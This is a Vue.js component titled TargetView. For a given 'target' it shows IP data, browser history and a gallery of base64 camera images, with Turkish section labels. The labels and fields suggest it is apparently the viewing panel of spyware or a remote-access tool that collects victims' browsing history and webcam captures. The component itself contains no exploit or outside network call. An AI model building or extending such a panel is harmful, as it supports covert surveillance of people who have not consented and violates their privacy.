<script>
import axios from "axios";

export default {
  name:'TargetView',
  props: ['target_id'],
  data: ()=>{return{
    target_data: null,
  }},
  methods:{
    async get_target_data(){
      const response = await axios.get(`/get/${this.target_id}/`)
      this.target_data = response.data
    }
  },
  mounted() {
    this.get_target_data()
  }
}
</script>

<template>
  <section>
    <article v-if="target_data">
      <strong>TARGET ID : {{ target_data._id }}</strong>
      <br>
      <strong>IP Data</strong>
      <ul style="max-height: 50vh; overflow-y: auto">
        <li v-for="(value, index) in Object.entries(target_data.ip_data)" :key="index">
          {{ value[0] }} : {{ value[1] }}
        </li>
      </ul>
      <hr>
      <strong>Geçmiş</strong>
      <ul style="max-height: 50vh; overflow-y: auto">
        <li v-for="history in target_data?.browser_history" >
          {{ history.date }} - {{ history.web }}
        </li>
      </ul>
      <hr>
      <strong>Resimler</strong>
      <ul style="max-height: 50vh; width: 100%; overflow-y: auto">
        <li v-for="camera in target_data?.camera">
          <img :src="'data:image/png;base64,'+ camera.picture" alt="Base64 Image">
          <span>
            {{camera.date}}
          </span>
        </li>
      </ul>
      <hr>
    </article>
    <article v-else>
      Loading
    </article>
  </section>
</template>

<style scoped>

</style>
